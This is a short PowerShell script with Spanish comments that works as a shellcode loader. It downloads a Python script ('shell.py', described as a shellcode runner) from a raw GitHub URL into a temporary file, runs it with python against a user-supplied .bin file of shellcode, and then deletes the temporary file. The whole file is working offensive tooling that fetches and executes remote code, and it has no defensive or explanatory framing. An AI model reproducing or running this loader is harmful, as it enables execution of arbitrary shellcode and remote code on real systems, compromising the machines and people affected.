param(
    [Parameter(Position=0, Mandatory=$true)]
    [string]$RutaBin
)

# URL del script Python en GitHub (raw)
$PythonScriptUrl = "https://raw.githubusercontent.com/AL4AROX/CodeBin/refs/heads/main/shell.py"

# Verificar que el archivo .bin existe localmente
if (-not (Test-Path $RutaBin)) {
    Write-Host "Error: No se encuentra el archivo .bin en la ruta especificada: $RutaBin" -ForegroundColor Red
    exit 1
}

# Verificar Python
$pythonExe = Get-Command python -ErrorAction SilentlyContinue
if (-not $pythonExe) {
    Write-Host "Error: Python no está instalado o no está en el PATH" -ForegroundColor Red
    exit 1
}

# Descargar script Python desde GitHub a un archivo temporal
Write-Host "[*] Descargando shellcode_runner.py desde GitHub..." -ForegroundColor Cyan
try {
    $tempPy = [System.IO.Path]::GetTempFileName() + ".py"
    Invoke-WebRequest -Uri $PythonScriptUrl -OutFile $tempPy
} catch {
    Write-Host "Error al descargar el script Python: $_" -ForegroundColor Red
    exit 1
}

# Ejecutar Python pasándole la ruta del .bin
Write-Host "[*] Ejecutando shellcode desde: $RutaBin" -ForegroundColor Green
try {
    & python $tempPy $RutaBin
} catch {
    Write-Host "Error al ejecutar Python: $_" -ForegroundColor Red
} finally {
    # Limpiar archivo temporal
    Remove-Item $tempPy -Force -ErrorAction SilentlyContinue
}
